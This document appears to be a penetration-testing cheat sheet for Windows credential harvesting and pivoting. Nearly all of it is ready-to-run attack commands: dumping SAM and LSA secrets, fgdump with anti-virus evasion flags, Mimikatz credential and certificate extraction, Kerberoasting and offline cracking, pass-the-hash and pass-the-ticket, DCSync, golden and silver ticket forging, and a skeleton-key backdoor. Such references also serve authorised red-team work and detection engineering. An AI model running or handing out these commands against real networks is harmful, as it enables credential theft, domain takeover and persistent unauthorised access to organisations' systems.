# Credentials and Pivoting

## Credentials harverst

### Manual hash dump - All windows versions

#### Key retrieval

Administrative privileges are required to dump register keys

```
reg.exe save hklm\sam c:\dp\sam.save
reg.exe save hklm\system c:\dp\system.save
reg.exe save hklm\security c:\dp\security.save
```

#### Local decryption

Impacket - secretsdump.py

```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Samdump

```
samdump2 system.save sam.save
```

### fgdump.exe - Windows 2000,XP

Runs locally, creates a file with the hashes.

```
fgdump.exe
fgdump.exe -t    #test for anti-virus presence
fgdump.exe -a    #don't try to disable anti-virus
fgdump.exe -r    #ignore existing dump files
```

### Mimikatz - Windows Vista,7,8,10

Elevate as NT AUTHORITY / SYSTEM

```
privilege::debug
token::whoami
token::elevate
```

Harvest credentials

```
sekurlsa::logonpasswords
sekurlsa::backupkeys
sekurlsa::credman
sekurlsa::dpapi
sekurlsa::dpapiSystem
sekurlsa::ekeys
lsadump::secrets
lsadump::sam
```

Harvest certificates and auth keys

```
crypto::listProviders
crypto::listKeys
crypto::listCertificates
crypto::exportCertificates
crypto::exportKeys
```

### Kerbertoasting

Obtain service login tickets by knowing its SPN (Service Principal Name)

```
klist
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
mimikatz.exe
kerberos::list /export
```

Crack the tickets locally. If John doesn't recognize the format install the Jumbo version from GitHub. These can be used to log into the service machine.

```
john --format=krb5tgs -w=<dict> <hash file>
hashcat -m 13100 --force -a 0 <dict> <hash file>
```

## Pivoting

### Pass the Hash

Use the hash to login in another machine as a local user without knowing its password. Works because NTLM hashes are static so if a user logs into different machines his hash will remain the same on each host.

```
pth-winexe -U <domain>/<user>%aad3b435b51404eeaad3b435b51404ee:<LM hash> //<target ip> cmd
smbexec.py <user>@<ip> -hashes aad3b435b51404eeaad3b435b51404ee:<LM hash>
#mimikatz
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:powershell.exe
```

### Pass the Ticket

Loads a ticket in memory granting the current user access to the remote machine/service within the context of the current session.

```
sekurlsa::tickets /export
kerberos::ptt <.krbi file>
.\PsExec.exe -accepteula \\<target host> cmd
```

### Winrm

```
evil-winrm -i <ip> -u Administrator -p <password>
evil-winrm -i <ip> -u Administrator -H <hash>
```

### Tickets

#### Silver ticket

```
kerberos::golden /domain:<domain> /sid:<SID> /rc4:<hash> /user:<user> /service:<srv> /target:<host>
kerberos::ptt ticket.kirbi
.\PsExec.exe -accepteula \\<target host> cmd
```

#### Golden ticket

```
lsadump::dcsync /user:<domain>\<user>
kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /krbtgt:<ticket> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\PsExec.exe -accepteula \\<target host> cmd
```

#### Skeleton key

```
misc::skeleton
```
